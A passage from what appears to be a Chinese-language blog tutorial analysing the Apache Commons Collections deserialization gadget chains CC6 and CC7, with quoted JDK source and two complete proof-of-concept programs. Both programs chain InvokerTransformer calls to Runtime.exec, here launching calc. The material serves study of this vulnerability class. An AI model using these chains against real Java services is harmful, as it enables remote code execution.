<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">...</span><br><span class="line">main:41, CommonsCollections5 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"><a href="#CommonsCollections6（HashMap→TiedMapEntry→LazyMap）" class="headerlink" title="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"></a>CommonsCollections6（HashMap→TiedMapEntry→LazyMap）</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的 <code>hashCode</code> 方法会调用到内部成员 <code>map</code> 的 <code>get</code> 方法，如果 <code>map</code> 被 <code>LazyMap</code> 修饰过就可以调用到 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>java.util.HashMap#readObject</code> 方法会对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(triggerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">...</span><br><span class="line">main:34, CommonsCollections6 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 <code>HashMap</code> 的 <code>put</code> 方法同样对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此在 poc 中当我们 <code>triggerMap.put(entry, &quot;123&quot;)</code> 时会调用 <code>TiedMapEntry.hashCode</code> 从而调用 <code>LazyMap.get</code>，使得 <code>TiedMapEntry.key</code> 已经放到 <code>TiedMapEntry.map</code> 中了，因此会导致后续反序列化无法虽然调用到 <code>LazyMap.get</code>，但是调用不到 <code>transform</code> 方法。解决方法是调用 <code>LazyMap.clear</code> 清空 <code>LazyMap</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections7（Hashtable→LazyMap）"><a href="#CommonsCollections7（Hashtable→LazyMap）" class="headerlink" title="CommonsCollections7（Hashtable→LazyMap）"></a>CommonsCollections7（Hashtable→LazyMap）</h3><p><code>Hashtable</code> 的 <code>readObject</code> 调用 <code>reconstitutionPut</code> 函数将反序列化出的键值对存储到哈希表 <code>table</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>reconstitutionPut</code> 函数先对传入的 <code>key</code> 调用 <code>hashCode</code> 方法得到哈希值，然后计算出哈希值对应哈希表的下标 <code>index</code>。在哈希表 <code>tab</code> 中遍历 <code>index</code> 对应的那一项中的每一个元素 <code>e</code>，然后判断该元素的哈希值与当前要添加的那一项的哈希值是否相等。如果哈希值相等则调用 <code>e.key.equals</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// 如果哈希值相等则对哈希表中的 key 调用 equals 方法。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 <code>HashMap</code> 和 <code>LazyMap</code> 有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20241108030406773.png"
                      alt="image-20241108030406773"
                ><br>可以看到，<code>HashMap</code> 继承于 <code>AbstraceMap</code>，<code>LazyMap</code> 继承于 <code>AbstractMapDecorator</code>。</p>
<p>因此如果 <code>HashTable</code> 中的 <code>key</code> 都是 <code>LazyMap</code> 修饰的 <code>HashMap</code> 那么 <code>e.key.equals</code> 最终会调用 <code>LazyMap#get</code> 进而触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// 确保不是同一个 LazyMap 对象</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">       <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">           <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">               Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">               <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key))) <span class="comment">// 调用 LazyMap#get</span></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.equals(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
<p>根据前面的分析可知我们可以在 <code>Hashtable</code> 放两个键值对满足两个键哈希值相同但不是同一个的 <code>LazyMap</code> 对像。而 <code>LazyMap</code> 的哈希值实际上就是 <code>Map</code> 中所有「键和值的哈希的异或值」之和。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstraceMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">            h += i.next().hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstractMapDecorator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>
<p>我们不妨让键值对中的值相等，那么就只需要考虑找哈希相等且值不同的键。</p>
<p>我们选择 <code>java.lang.String</code> 类型的键，这个类型的 <code>hashCode</code> 实现如下，我们很容易就想到可以构造长度为 2 的字符串，然后通过前一个字符的 ascii 码加 1 然后后一个字符的 ascii 码减 31 抵消前一个字符的影响来得到两个哈希相同的字符串（例如 <code>Aa</code>→<code>[65,97]</code>→<code>[65+1,97-31]</code>→<code>[66,66]</code>→<code>BB</code>）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
